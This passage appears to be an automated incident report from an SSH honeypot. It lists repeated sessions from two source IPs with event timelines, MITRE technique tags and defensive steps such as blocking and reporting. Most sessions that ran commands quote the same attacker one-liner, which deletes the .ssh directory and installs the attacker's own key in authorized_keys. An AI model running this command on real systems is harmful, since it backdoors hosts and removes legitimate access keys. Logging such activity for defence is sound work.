| `2026-05-25 20:18:41` | `cowrie.command.failed` |
| `2026-05-25 20:18:41` | `cowrie.log.closed` |
| `2026-05-25 20:18:42` | `cowrie.session.params` |
| `2026-05-25 20:18:42` | `cowrie.command.input` |
| `2026-05-25 20:18:42` | `cowrie.session.file_download` |
| `2026-05-25 20:18:42` | `cowrie.log.closed` |
| `2026-05-25 20:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-820b6cb9d0af

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:18 |
| **Last Seen** | 2026-05-25 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:18:44` | `cowrie.session.connect` |
| `2026-05-25 20:18:44` | `cowrie.client.version` |
| `2026-05-25 20:18:44` | `cowrie.client.kex` |
| `2026-05-25 20:18:45` | `cowrie.login.success` |
| `2026-05-25 20:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343ee1b9b3e4

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:15` | `cowrie.session.connect` |
| `2026-05-25 20:19:15` | `cowrie.client.version` |
| `2026-05-25 20:19:16` | `cowrie.client.kex` |
| `2026-05-25 20:19:16` | `cowrie.login.success` |
| `2026-05-25 20:19:17` | `cowrie.session.params` |
| `2026-05-25 20:19:17` | `cowrie.command.input` |
| `2026-05-25 20:19:17` | `cowrie.command.failed` |
| `2026-05-25 20:19:17` | `cowrie.log.closed` |
| `2026-05-25 20:19:17` | `cowrie.session.params` |
| `2026-05-25 20:19:17` | `cowrie.command.input` |
| `2026-05-25 20:19:17` | `cowrie.session.file_download` |
| `2026-05-25 20:19:17` | `cowrie.log.closed` |
| `2026-05-25 20:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cae4c94c8e3c

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:20` | `cowrie.session.connect` |
| `2026-05-25 20:19:20` | `cowrie.client.version` |
| `2026-05-25 20:19:20` | `cowrie.client.kex` |
| `2026-05-25 20:19:20` | `cowrie.login.success` |
| `2026-05-25 20:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a63b9aafa1

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:33` | `cowrie.session.connect` |
| `2026-05-25 20:19:33` | `cowrie.client.version` |
| `2026-05-25 20:19:33` | `cowrie.client.kex` |
| `2026-05-25 20:19:34` | `cowrie.login.success` |
| `2026-05-25 20:19:34` | `cowrie.session.params` |
| `2026-05-25 20:19:34` | `cowrie.command.input` |
| `2026-05-25 20:19:34` | `cowrie.command.failed` |
| `2026-05-25 20:19:34` | `cowrie.log.closed` |
| `2026-05-25 20:19:35` | `cowrie.session.params` |
| `2026-05-25 20:19:35` | `cowrie.command.input` |
| `2026-05-25 20:19:35` | `cowrie.session.file_download` |
| `2026-05-25 20:19:35` | `cowrie.log.closed` |
| `2026-05-25 20:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc7d2f39f72

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:37` | `cowrie.session.connect` |
| `2026-05-25 20:19:37` | `cowrie.client.version` |
| `2026-05-25 20:19:37` | `cowrie.client.kex` |
| `2026-05-25 20:19:38` | `cowrie.login.success` |
| `2026-05-25 20:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72a2b138602

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:53` | `cowrie.session.connect` |
| `2026-05-25 20:19:53` | `cowrie.client.version` |
| `2026-05-25 20:19:53` | `cowrie.client.kex` |
| `2026-05-25 20:19:54` | `cowrie.login.success` |
| `2026-05-25 20:19:54` | `cowrie.session.params` |
| `2026-05-25 20:19:54` | `cowrie.command.input` |
| `2026-05-25 20:19:54` | `cowrie.command.failed` |
| `2026-05-25 20:19:54` | `cowrie.log.closed` |
| `2026-05-25 20:19:55` | `cowrie.session.params` |
| `2026-05-25 20:19:55` | `cowrie.command.input` |
| `2026-05-25 20:19:55` | `cowrie.session.file_download` |
| `2026-05-25 20:19:55` | `cowrie.log.closed` |
| `2026-05-25 20:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0924201ef60

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:19 |
| **Last Seen** | 2026-05-25 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:19:57` | `cowrie.session.connect` |
| `2026-05-25 20:19:57` | `cowrie.client.version` |
| `2026-05-25 20:19:57` | `cowrie.client.kex` |
| `2026-05-25 20:19:58` | `cowrie.login.success` |
| `2026-05-25 20:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa07a4ebc129

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:20 |
| **Last Seen** | 2026-05-25 20:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:20:11` | `cowrie.session.connect` |
| `2026-05-25 20:20:11` | `cowrie.client.version` |
| `2026-05-25 20:20:11` | `cowrie.client.kex` |
| `2026-05-25 20:20:11` | `cowrie.login.success` |
| `2026-05-25 20:20:12` | `cowrie.session.params` |
| `2026-05-25 20:20:12` | `cowrie.command.input` |
| `2026-05-25 20:20:12` | `cowrie.command.failed` |
| `2026-05-25 20:20:12` | `cowrie.log.closed` |
| `2026-05-25 20:20:12` | `cowrie.session.params` |
| `2026-05-25 20:20:12` | `cowrie.command.input` |
| `2026-05-25 20:20:13` | `cowrie.session.file_download` |
| `2026-05-25 20:20:13` | `cowrie.log.closed` |
| `2026-05-25 20:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b2154d6982c

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:20 |
| **Last Seen** | 2026-05-25 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:20:15` | `cowrie.session.connect` |
| `2026-05-25 20:20:15` | `cowrie.client.version` |
| `2026-05-25 20:20:15` | `cowrie.client.kex` |
| `2026-05-25 20:20:16` | `cowrie.login.success` |
| `2026-05-25 20:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440c2c1713c4

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:20 |
| **Last Seen** | 2026-05-25 20:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:20:29` | `cowrie.session.connect` |
| `2026-05-25 20:20:29` | `cowrie.client.version` |
| `2026-05-25 20:20:29` | `cowrie.client.kex` |
| `2026-05-25 20:20:29` | `cowrie.login.success` |
| `2026-05-25 20:20:30` | `cowrie.session.params` |
| `2026-05-25 20:20:30` | `cowrie.command.input` |
| `2026-05-25 20:20:30` | `cowrie.command.failed` |
| `2026-05-25 20:20:30` | `cowrie.log.closed` |
| `2026-05-25 20:20:30` | `cowrie.session.params` |
| `2026-05-25 20:20:30` | `cowrie.command.input` |
| `2026-05-25 20:20:30` | `cowrie.session.file_download` |
| `2026-05-25 20:20:30` | `cowrie.log.closed` |
| `2026-05-25 20:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162357b28afb

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:20 |
| **Last Seen** | 2026-05-25 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:20:33` | `cowrie.session.connect` |
| `2026-05-25 20:20:33` | `cowrie.client.version` |
| `2026-05-25 20:20:33` | `cowrie.client.kex` |
| `2026-05-25 20:20:34` | `cowrie.login.success` |
| `2026-05-25 20:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb27ff63667

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 20:46 |
| **Last Seen** | 2026-05-25 20:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:46:50` | `cowrie.session.connect` |
| `2026-05-25 20:46:50` | `cowrie.client.version` |
| `2026-05-25 20:46:50` | `cowrie.client.kex` |
| `2026-05-25 20:46:52` | `cowrie.login.success` |
| `2026-05-25 20:46:53` | `cowrie.session.params` |
| `2026-05-25 20:46:53` | `cowrie.command.input` |
| `2026-05-25 20:46:53` | `cowrie.command.failed` |
| `2026-05-25 20:46:53` | `cowrie.log.closed` |
| `2026-05-25 20:46:53` | `cowrie.session.params` |
| `2026-05-25 20:46:53` | `cowrie.command.input` |
| `2026-05-25 20:46:54` | `cowrie.session.file_download` |
| `2026-05-25 20:46:54` | `cowrie.log.closed` |
| `2026-05-25 20:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b12efb4406

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 20:46 |
| **Last Seen** | 2026-05-25 20:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:46:56` | `cowrie.session.connect` |
| `2026-05-25 20:46:56` | `cowrie.client.version` |
| `2026-05-25 20:46:56` | `cowrie.client.kex` |
| `2026-05-25 20:46:57` | `cowrie.login.success` |
| `2026-05-25 20:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-768909ce7b4a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 20:56 |
| **Last Seen** | 2026-05-25 20:56 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:56:01` | `cowrie.session.connect` |
| `2026-05-25 20:56:01` | `cowrie.client.version` |
| `2026-05-25 20:56:01` | `cowrie.client.kex` |
| `2026-05-25 20:56:03` | `cowrie.login.success` |
| `2026-05-25 20:56:03` | `cowrie.session.params` |
| `2026-05-25 20:56:03` | `cowrie.command.input` |
| `2026-05-25 20:56:03` | `cowrie.command.failed` |
| `2026-05-25 20:56:05` | `cowrie.log.closed` |
| `2026-05-25 20:56:07` | `cowrie.session.params` |
| `2026-05-25 20:56:07` | `cowrie.command.input` |
| `2026-05-25 20:56:08` | `cowrie.session.file_download` |
| `2026-05-25 20:56:08` | `cowrie.log.closed` |
| `2026-05-25 20:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49ffb197f63

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 20:56 |
| **Last Seen** | 2026-05-25 20:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:56:12` | `cowrie.session.connect` |
| `2026-05-25 20:56:12` | `cowrie.client.version` |
| `2026-05-25 20:56:13` | `cowrie.client.kex` |
| `2026-05-25 20:56:16` | `cowrie.login.success` |
| `2026-05-25 20:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df8ac844ea1

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 21:05 |
| **Last Seen** | 2026-05-25 21:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 21:05:09` | `cowrie.session.connect` |
| `2026-05-25 21:05:09` | `cowrie.client.version` |
| `2026-05-25 21:05:09` | `cowrie.client.kex` |
| `2026-05-25 21:05:10` | `cowrie.login.success` |
| `2026-05-25 21:05:11` | `cowrie.session.params` |
| `2026-05-25 21:05:11` | `cowrie.command.input` |
| `2026-05-25 21:05:11` | `cowrie.command.failed` |
| `2026-05-25 21:05:11` | `cowrie.log.closed` |
| `2026-05-25 21:05:13` | `cowrie.session.params` |
| `2026-05-25 21:05:13` | `cowrie.command.input` |
| `2026-05-25 21:05:13` | `cowrie.session.file_download` |
| `2026-05-25 21:05:13` | `cowrie.log.closed` |
| `2026-05-25 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568d857bb306

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 21:05 |
| **Last Seen** | 2026-05-25 21:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 21:05:19` | `cowrie.session.connect` |
| `2026-05-25 21:05:19` | `cowrie.client.version` |
| `2026-05-25 21:05:19` | `cowrie.client.kex` |
| `2026-05-25 21:05:21` | `cowrie.login.success` |
| `2026-05-25 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP
